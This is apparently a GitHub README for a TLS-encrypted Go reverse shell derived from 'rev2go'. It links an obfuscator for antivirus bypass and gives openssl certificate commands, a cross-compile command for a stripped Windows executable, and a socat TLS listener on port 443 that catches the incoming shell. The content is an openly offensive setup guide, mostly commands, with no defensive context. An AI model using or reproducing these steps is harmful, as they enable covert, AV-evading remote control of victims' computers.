# go reverse shell secure

A TLS enabled implementation of a clean go reverse shell "rev2go" by sathish09.

Why Go? Check it out over at his blog. 
- https://medium.com/@sathish__kumar/undetectable-reverse-shell-with-golang-4fd4b1e172c1
- https://github.com/sathish09/rev2go

AV bypass, consider the following.
- https://github.com/unixpickle/gobfuscate

**Generate server certificate or disable client validation (yahoo! pew pew pew!)**
```
openssl genrsa -out server.key 2048 
openssl ecparam -genkey -name secp384r1 -out server.key
openssl req -new -x509 -sha256 -key server.key -out server.crt -days 3650
```

**Build for target platform**

Windows:
```
env GOOS=windows GOARCH=386 go build -ldflags "-s -w" -o gors.exe gors.go
```
Use build reference table for specific target architecture.
* https://github.com/sathish09/rev2go#build

**Listener**
```
socat openssl-listen:443,reuseaddr,fork,cert=/tmp/gors/server.pem,cafile=/tmp/gors/server.crt,verify=0 -
```

![image](https://user-images.githubusercontent.com/56988989/69015224-f394b480-0989-11ea-8e42-71038b778e06.png)

Enjoy~
